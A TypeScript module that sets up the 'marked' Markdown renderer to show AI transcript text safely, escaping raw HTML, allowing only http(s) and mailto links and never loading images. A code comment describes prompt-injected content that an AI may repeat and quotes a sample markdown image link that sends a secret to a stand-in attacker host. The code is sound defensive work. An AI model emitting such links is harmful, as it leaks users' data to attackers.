import { marked } from "marked";

export const esc = (s: string) => s.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]!);
// Transcript text can carry prompt-injected content (web pages, files, tool output that Claude repeats), so:
// raw HTML is shown as text, links work only for http(s)/mailto (no javascript:), and images are never loaded:
// `![](https://attacker/?d=<secret>)` would otherwise leak data the moment it renders. The server's CSP backs this up.
const SAFE_URL = /^(https?:|mailto:)/i;
marked.use({
  gfm: true,
  breaks: false,
  renderer: {
    html: ({ text }: { text: string }) => esc(text),
    link(this: any, { href, title, tokens }: { href: string; title?: string | null; tokens: any[] }) {
      const label = this.parser.parseInline(tokens);
      if (!SAFE_URL.test(href ?? "")) return label;
      return `<a href="${esc(href)}" target="_blank" rel="noopener noreferrer nofollow"${title ? ` title="${esc(title)}"` : ""}>${label}</a>`;
    },
    image({ href, text }: { href: string; text: string }) {
      return `<span class="img-ref">[image: ${esc(text || "untitled")}${SAFE_URL.test(href ?? "") ? ` — ${esc(href)}` : ""}]</span>`;
    },
  },
});

export function renderMarkdown(text: string): string {
  return marked.parse(text, { async: false }) as string;
}
